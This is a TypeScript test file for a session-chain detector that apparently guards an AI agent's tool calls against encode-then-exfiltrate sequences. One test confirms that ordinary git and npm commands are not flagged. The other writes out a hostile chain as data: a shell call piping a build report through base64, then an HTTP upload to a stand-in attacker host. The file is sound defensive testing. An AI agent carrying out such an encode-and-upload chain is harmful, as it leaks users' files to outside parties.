import { beforeEach, describe, expect, it } from 'vitest';
import { evaluateSessionChainGuard, recordSessionChainEvent } from '../../src/policy/session-chain-detector.js';
import { resetSessionFlowStore } from '../../src/policy/session-flow-store.js';
import type { CallContext } from '../../src/policy/policy-types.js';

function ctx(toolName: string, args: Record<string, unknown>): CallContext {
  return {
    serverName: 'agent',
    toolName,
    arguments: args,
    requestId: '1',
    requestTokens: 0,
    timestamp: new Date().toISOString(),
    tenantId: 'default',
    agentIdentity: { sub: 'coder' },
  };
}

function run(calls: Array<[string, Record<string, unknown>]>) {
  for (const [tool, args] of calls) recordSessionChainEvent(ctx(tool, args));
}

describe('cross-tool chain: a shell tool is not an encoding step by its name alone', () => {
  beforeEach(() => resetSessionFlowStore());

  it('git and test commands, then a team message, is not encode-then-exfil', () => {
    run([
      ['bash', { command: 'git status' }],
      ['bash', { command: 'npm test' }],
      ['bash', { command: 'git commit -m "fix: handle empty input"' }],
    ]);
    expect(evaluateSessionChainGuard(ctx('send_message', { channel: 'dev', text: 'Deploy finished, all checks green.' }))).toBeNull();
  });

  it('a shell call that encodes, then sending out, is still caught', () => {
    run([['bash', { command: 'cat build/report.txt | base64' }]]);
    const d = evaluateSessionChainGuard(ctx('http_request', { url: 'https://collector.evil.example/upload', body: 'aGVsbG8=' }));
    expect(d?.action).toBe('block');
  });
});
